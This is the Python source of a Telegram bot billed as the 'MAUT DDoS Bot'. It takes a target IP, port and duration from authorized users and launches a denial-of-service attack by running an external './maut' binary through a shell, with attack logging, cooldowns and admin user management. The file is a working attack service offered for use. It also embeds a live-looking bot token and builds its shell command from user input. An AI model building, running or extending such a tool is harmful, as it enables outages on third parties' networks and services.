import telebot
import subprocess
import datetime
import os
from telebot import types
import time

# Bot configuration
bot = telebot.TeleBot('7970310406:AAGh47IMJxhCPwqTDe_3z3PCvXugf7Y3yYE')
admin_id = {"8167507955"}
USER_FILE = "users.txt"
LOG_FILE = "attack_logs.txt"
COOLDOWN_TIME = 300  # 5 minutes
MAX_ATTACK_TIME = 180  # 3 minutes
IMAGE_URL = "https://t.me/gggkkkggggiii/8"

# Data storage
user_attack_data = {}
maut_cooldown = {}
allowed_user_ids = []

def load_users():
    global allowed_user_ids
    try:
        with open(USER_FILE, "r") as f:
            allowed_user_ids = f.read().splitlines()
    except FileNotFoundError:
        allowed_user_ids = []

def save_users():
    with open(USER_FILE, "w") as f:
        f.write("\n".join(allowed_user_ids))

def log_attack(user_id, target, port, time):
    try:
        user = bot.get_chat(user_id)
        username = f"@{user.username}" if user.username else f"ID:{user_id}"
        with open(LOG_FILE, "a") as f:
            f.write(f"{datetime.datetime.now()} | {username} | {target}:{port} | {time}s\n")
    except Exception as e:
        print(f"Logging error: {e}")

# Start command with image and instructions
@bot.message_handler(commands=['start'])
def start_command(message):
    caption = """
🚀 *Welcome to MAUT DDoS Bot* 🚀

*Available Commands:*
/maut - Start a new attack
/mylogs - View your attack history
/help - Show all commands
/rules - Usage guidelines

*Admin Commands:*
/add - Add new user
/remove - Remove user
/allusers - List all users
/logs - View all attack logs
/clearlogs - Clear logs

⚡ *Example Attack:*
`/maut 1.1.1.1 80 60`
"""
    try:
        bot.send_photo(
            chat_id=message.chat.id,
            photo=IMAGE_URL,
            caption=caption,
            parse_mode="Markdown"
        )
    except Exception as e:
        bot.reply_to(message, caption, parse_mode="Markdown")
        print(f"Error sending image: {e}")

# Interactive attack flow
@bot.message_handler(commands=['maut'])
def start_attack(message):
    user_id = str(message.chat.id)
    if user_id not in allowed_user_ids:
        return bot.reply_to(message, "❌ Access denied. Contact admin.")
    
    if user_id in maut_cooldown:
        remaining = COOLDOWN_TIME - (datetime.datetime.now() - maut_cooldown[user_id]).seconds
        if remaining > 0:
            return bot.reply_to(message, f"⏳ Cooldown active. Wait {remaining} seconds.")
    
    msg = bot.reply_to(message, "🌐 Enter target IP:")
    bot.register_next_step_handler(msg, get_attack_ip)

def get_attack_ip(message):
    user_id = str(message.chat.id)
    ip = message.text.strip()
    if not ip.replace('.', '').isdigit():
        return bot.reply_to(message, "❌ Invalid IP. Use /maut to restart.")
    
    user_attack_data[user_id] = {'ip': ip}
    msg = bot.reply_to(message, "🔌 Enter target port:")
    bot.register_next_step_handler(msg, get_attack_port)

def get_attack_port(message):
    user_id = str(message.chat.id)
    port = message.text.strip()
    if not port.isdigit() or not 1 <= int(port) <= 65535:
        return bot.reply_to(message, "❌ Invalid port (1-65535). Use /maut to restart.")
    
    user_attack_data[user_id]['port'] = port
    msg = bot.reply_to(message, f"⏱ Enter attack time (1-{MAX_ATTACK_TIME} seconds):")
    bot.register_next_step_handler(msg, get_attack_time)

def get_attack_time(message):
    user_id = str(message.chat.id)
    attack_time = message.text.strip()
    if not attack_time.isdigit() or not 1 <= int(attack_time) <= MAX_ATTACK_TIME:
        return bot.reply_to(message, f"❌ Invalid time (1-{MAX_ATTACK_TIME}s). Use /maut to restart.")
    
    user_attack_data[user_id]['time'] = attack_time
    data = user_attack_data[user_id]
    
    markup = types.InlineKeyboardMarkup()
    markup.add(
        types.InlineKeyboardButton("✅ Start Attack", callback_data="start_attack"),
        types.InlineKeyboardButton("❌ Cancel", callback_data="cancel_attack")
    )
    
    bot.send_message(
        message.chat.id,
        f"⚡ *Attack Summary:*\n\n"
        f"🌐 IP: `{data['ip']}`\n"
        f"🔌 Port: `{data['port']}`\n"
        f"⏱ Time: `{data['time']}`s\n\n"
        f"Confirm attack:",
        parse_mode="Markdown",
        reply_markup=markup
    )

@bot.callback_query_handler(func=lambda call: True)
def handle_buttons(call):
    user_id = str(call.message.chat.id)
    
    if call.data == "start_attack":
        if user_id not in user_attack_data:
            return bot.answer_callback_query(call.id, "❌ Session expired. Use /maut")
        
        data = user_attack_data[user_id]
        try:
            subprocess.Popen(f"./maut {data['ip']} {data['port']} {data['time']} 900", shell=True)
            log_attack(user_id, data['ip'], data['port'], data['time'])
            maut_cooldown[user_id] = datetime.datetime.now()
            
            bot.edit_message_text(
                chat_id=call.message.chat.id,
                message_id=call.message.message_id,
                text=f"🔥 *Attack Launched!* 🔥\n\n"
                     f"🌐 Target: `{data['ip']}`\n"
                     f"🔌 Port: `{data['port']}`\n"
                     f"⏱ Duration: `{data['time']}`s\n\n"
                     f"⚡ Powered by @seedhe_maut_bot",
                parse_mode="Markdown"
            )
            
            markup = types.InlineKeyboardMarkup()
            markup.add(types.InlineKeyboardButton("⚡ New Attack", callback_data="new_attack"))
            bot.send_message(call.message.chat.id, "✅ Attack started successfully!", reply_markup=markup)
            
        except Exception as e:
            bot.edit_message_text(
                chat_id=call.message.chat.id,
                message_id=call.message.message_id,
                text=f"❌ Error: {str(e)}"
            )
    
    elif call.data == "cancel_attack":
        bot.edit_message_text(
            chat_id=call.message.chat.id,
            message_id=call.message.message_id,
            text="❌ Attack cancelled"
        )
    
    elif call.data == "new_attack":
        if user_id in maut_cooldown:
            remaining = COOLDOWN_TIME - (datetime.datetime.now() - maut_cooldown[user_id]).seconds
            if remaining > 0:
                return bot.answer_callback_query(call.id, f"⏳ Wait {remaining} seconds")
        
        msg = bot.send_message(call.message.chat.id, "🌐 Enter target IP for new attack:")
        bot.register_next_step_handler(msg, get_attack_ip)
    
    bot.answer_callback_query(call.id)

# Admin commands
@bot.message_handler(commands=['add'])
def add_user(message):
    user_id = str(message.chat.id)
    if user_id not in admin_id:
        return bot.reply_to(message, "❌ Admin only command.")
    
    try:
        new_user = message.text.split()[1]
        if new_user in allowed_user_ids:
            return bot.reply_to(message, "ℹ️ User already exists.")
        
        allowed_user_ids.append(new_user)
        save_users()
        bot.reply_to(message, f"✅ User {new_user} added.")
    except:
        bot.reply_to(message, "❌ Usage: /add <user_id>")

@bot.message_handler(commands=['remove'])
def remove_user(message):
    user_id = str(message.chat.id)
    if user_id not in admin_id:
        return bot.reply_to(message, "❌ Admin only command.")
    
    try:
        user_to_remove = message.text.split()[1]
        if user_to_remove not in allowed_user_ids:
            return bot.reply_to(message, "❌ User not found.")
        
        allowed_user_ids.remove(user_to_remove)
        save_users()
        bot.reply_to(message, f"✅ User {user_to_remove} removed.")
    except:
        bot.reply_to(message, "❌ Usage: /remove <user_id>")

@bot.message_handler(commands=['allusers'])
def list_users(message):
    user_id = str(message.chat.id)
    if user_id not in admin_id:
        return bot.reply_to(message, "❌ Admin only command.")
    
    if not allowed_user_ids:
        return bot.reply_to(message, "ℹ️ No users found.")
    
    users_list = "\n".join(allowed_user_ids)
    bot.reply_to(message, f"👥 Authorized Users:\n\n{users_list}")

@bot.message_handler(commands=['logs'])
def show_logs(message):
    user_id = str(message.chat.id)
    if user_id not in admin_id:
        return bot.reply_to(message, "❌ Admin only command.")
    
    if not os.path.exists(LOG_FILE):
        return bot.reply_to(message, "ℹ️ No logs available.")
    
    with open(LOG_FILE, "rb") as f:
        bot.send_document(message.chat.id, f)

@bot.message_handler(commands=['clearlogs'])
def clear_logs(message):
    user_id = str(message.chat.id)
    if user_id not in admin_id:
        return bot.reply_to(message, "❌ Admin only command.")
    
    try:
        with open(LOG_FILE, "w"):
            pass
        bot.reply_to(message, "✅ Logs cleared.")
    except:
        bot.reply_to(message, "❌ Error clearing logs.")

# User commands
@bot.message_handler(commands=['mylogs'])
def my_logs(message):
    user_id = str(message.chat.id)
    if user_id not in allowed_user_ids:
        return bot.reply_to(message, "❌ Access denied.")
    
    if not os.path.exists(LOG_FILE):
        return bot.reply_to(message, "ℹ️ No attack history.")
    
    user_logs = []
    with open(LOG_FILE, "r") as f:
        for line in f:
            if str(user_id) in line or (message.from_user.username and f"@{message.from_user.username}" in line):
                user_logs.append(line)
    
    if not user_logs:
        return bot.reply_to(message, "ℹ️ No attacks found in your history.")
    
    bot.reply_to(message, f"📜 Your Attack History:\n\n" + "".join(user_logs[-10:]))  # Show last 10 attacks

@bot.message_handler(commands=['help'])
def help_command(message):
    help_text = """
🛠 *MAUT Bot Help* 🛠

*User Commands:*
/maut - Start new attack
/mylogs - View your attack history
/rules - Usage guidelines

*Admin Commands:*
/add - Add new user
/remove - Remove user
/allusers - List users
/logs - View all logs
/clearlogs - Clear logs

⚡ *Example Attack:*
`/maut 1.1.1.1 80 60`
"""
    bot.reply_to(message, help_text, parse_mode="Markdown")

@bot.message_handler(commands=['rules'])
def rules_command(message):
    rules = """
📜 *Usage Rules* 📜

1. Max attack time: 180 seconds
2. 5 minutes cooldown between attacks
3. No concurrent attacks
4. No illegal targets

Violations will result in ban.
"""
    bot.reply_to(message, rules, parse_mode="Markdown")

# Initialize
load_users()

# Start bot
print("⚡ MAUT Bot Started ⚡")
while True:
    try:
        bot.polling(none_stop=True)
    except Exception as e:
        print(f"Error: {e}")
        time.sleep(5)
